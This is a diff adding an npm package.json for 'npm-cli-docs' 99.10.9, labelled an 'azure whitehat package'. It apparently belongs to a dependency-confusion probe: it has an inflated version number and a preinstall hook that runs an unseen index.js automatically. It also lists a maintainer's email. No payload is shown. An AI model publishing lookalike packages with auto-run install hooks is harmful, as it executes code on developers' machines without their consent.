@@ -1,0 +1,39 @@
+{
+    "name": "npm-cli-docs",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "npm-cli-docs@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-POIRBulJINdIyp5ThbQyxgEOEDX1BmVaiTMlK4MghdgYS/cR44i5MOmFR/r6I2gn61kXA4NTjRLuuSuHFt3q1Q==",
+        "shasum": "0216f3fa4b4bd2c607b3d802828cfd2b72a1ebcb",
+        "tarball": "https://registry.npmjs.org/npm-cli-docs/-/npm-cli-docs-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3576,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRHbCRA9TVsSAnZWagAABZoP/0tMmUrEw4+kE1xk27ea\njnlv3Bwg/79ctOnmpjCWsavMmjE1ABgEI5QO7U5FpsfXa0lgAXnvCGIJixi+\nO7SFqw2De9Ah0vlY9N1mY3kMPe35W94XB7gAAuKbt14E1CXRAI6br1wxHWMg\nk9EO6XN2qUptvc872X69tzHCvD8aH0bcmupXODNvW/htWRSEP+GYsn5ZoYUg\nZnOiCbHQKUj6pdK9cGZL8TkAI1OaPt2F9WR+N1s9lsEF/fz8DtHIqCpgKGkV\nxikuLfGt1fp5cjG/oIGJs2scZTIJPFFz/y35IhVkC+i3//lRzyzUg68vbvF+\nFGWz61AG+iWLEpuaWYCytCXcnS5g4wuZSby+coPIfcASXuQX05nVzK0uSnnA\nj56C7ku0ar8/JgqFMCyEGwGi8LLs0brKWeEUjgvpqJETmULBtYVNadpKSrvd\nEkDv90NA2SWhMQU8HFAu80L4X0cPgxSWNfesf2ih+ABggmPkgo2FAJwQ4oA4\nz4wX1yiptnrVjhgncxdLTphrYC2qDHUvqGAKJscK4DeMeGrBp6fcYNY9t2ed\nJoSK16KDbBEEcwZUSljds0IbegDTsVsWBjr9ixF7zE8fhlJmvu8fNI99432N\ntqYWCX5lG6hsM+6lk/tJOOPi64jAJk/HPO6fKa62WDGjPuvor4jB9WWG4Nct\n0Tss\r\n=4cZn\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/npm-cli-docs_99.10.9_1637945819292_0.48758590459094076"
+    },
+    "_hasShrinkwrap": false
+}
